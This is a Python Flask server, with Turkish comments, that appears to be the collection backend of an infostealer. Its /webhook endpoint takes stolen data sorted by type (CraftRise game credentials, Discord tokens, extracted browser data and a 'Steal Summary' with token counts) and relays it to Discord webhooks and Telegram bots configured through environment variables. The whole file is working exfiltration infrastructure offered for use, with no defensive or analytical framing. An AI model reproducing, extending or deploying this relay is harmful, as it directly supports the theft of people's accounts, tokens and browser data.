from flask import Flask, request, jsonify
import requests
import json
import os
from datetime import datetime

app = Flask(__name__)

# Environment variables'dan alınacak
WEBHOOK = os.environ.get("WEBHOOK", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
DISCORD_TELEGRAM_TOKEN = os.environ.get("DISCORD_TELEGRAM_TOKEN", "")
DISCORD_TELEGRAM_CHAT_ID = os.environ.get("DISCORD_TELEGRAM_CHAT_ID", "")
CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")
MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")

def send_discord(url, data):
    """Discord'a gönder - data zaten webhook formatında olabilir"""
    if not url:
        return
    try:
        # Eğer data string ise content olarak gönder
        if isinstance(data, str):
            requests.post(url, json={"content": data}, timeout=30)
        else:
            # data zaten webhook formatında (content, embeds vb.)
            requests.post(url, json=data, timeout=30)
    except Exception as e:
        print(f"Discord hatası: {e}")

def send_telegram(token, chat_id, msg):
    if token and chat_id:
        try:
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                         json={"chat_id": chat_id, "text": msg}, timeout=30)
        except:
            pass

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        
        # Gelen verinin tipini al
        log_type = data.get("type", "unknown")
        payload = data.get("data", data)  # Eğer data içinde data yoksa direk payload
        
        print(f"[{datetime.now()}] Type: {log_type}")
        
        # ============ CRAFTRISE ============
        if log_type == "craftrise":
            # CraftRise direkt gönder (zaten webhook formatında)
            send_discord(CRAFTRISE_WEBHOOK, payload)
            # Telegram için text çıkar
            tg_text = payload.get("content", str(payload))
            send_telegram(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, tg_text)
        
        # ============ DISCORD TOKEN ============
        elif log_type == "discord":
            # Discord token direkt gönder (zaten webhook formatında)
            send_discord(DISCORD_WEBHOOK, payload)
            # Telegram için bilgi çıkar
            content = payload.get("content", "")
            send_telegram(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, content)
        
        # ============ BROWSER ============
        elif log_type == "browser":
            msg = f"🕸️ **Browser Data Extracted!**\n```json\n{json.dumps(payload, indent=2)[:1500]}\n```"
            send_discord(MASTER_WEBHOOK, msg)
        
        # ============ SUMMARY / GLOBAL ============
        else:
            # Özet bilgiyi gönder
            if isinstance(payload, dict) and "token_count" in payload:
                msg = f"📊 **Steal Summary!**\n```json\n{json.dumps(payload, indent=2)}\n```"
            else:
                msg = f"📦 **New Data!**\n```json\n{json.dumps(payload, indent=2)[:1500]}\n```"
            
            send_discord(WEBHOOK, msg)
            send_telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, msg)
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"Hata: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home():
    return "HollyShit Proxy Running"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
